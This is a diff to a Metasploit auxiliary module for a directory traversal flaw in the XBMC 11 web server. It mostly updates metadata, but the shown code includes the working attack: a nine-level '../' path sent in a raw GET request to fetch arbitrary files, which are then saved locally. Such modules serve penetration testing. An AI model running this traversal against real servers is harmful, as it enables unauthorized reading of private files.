@@ -17,21 +17,22 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'           => "XBMC Web Server Directory Traversal",
 			'Description'    => %q{
-					This module exploits a directory traversal bug in XBMC 11.
+					This module exploits a directory traversal bug in XBMC 11, up until the 2012-11-04 nightly build.
 					The module can only be used to retrieve files.
 			},
 			'License'        => MSF_LICENSE,
 			'Author'         =>
 				[
-					'sinn3r', # Used sinn3r's yaws_traversal exploit as a skeleton 
+					'sinn3r', # Used sinn3r's yaws_traversal exploit as a skeleton
 					'Lucas "acidgen" Lundgren IOActive',
 					'Matt "hostess" Andreko',
 				],
 			'References'     =>
 				[
-					['URL', 'http://forum.xbmc.org/showthread.php?tid=144110&pid=1227348']
+					['URL', 'http://forum.xbmc.org/showthread.php?tid=144110&pid=1227348'],
+					['URL', 'https://github.com/xbmc/xbmc/commit/bdff099c024521941cb0956fe01d99ab52a65335'],
 				],
-			'DisclosureDate' => "Nov 1 2012"
+			'DisclosureDate' => "Nov 4 2012"
 		))
 
 		register_options(
@@ -53,7 +54,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		# Create request
-		traversal = "../../../../../../../../.."
+		traversal = "../../../../../../../../.." #The longest of all platforms tested was 9 deep
 		res = send_request_raw({
 			'method' => 'GET',
 			'uri'    => "/#{traversal}/#{datastore['FILEPATH']}",
@@ -75,7 +76,7 @@ class Metasploit3 < Msf::Auxiliary
 				)
 				print_good("File saved in: #{path}")
 			elsif res.code == 401
-				print_error("#{rhost}:#{rport} Authentication failed")		
+				print_error("#{rhost}:#{rport} Authentication failed")
 			elsif res.code == 404
 				print_error("#{rhost}:#{rport} File not found")
 			end
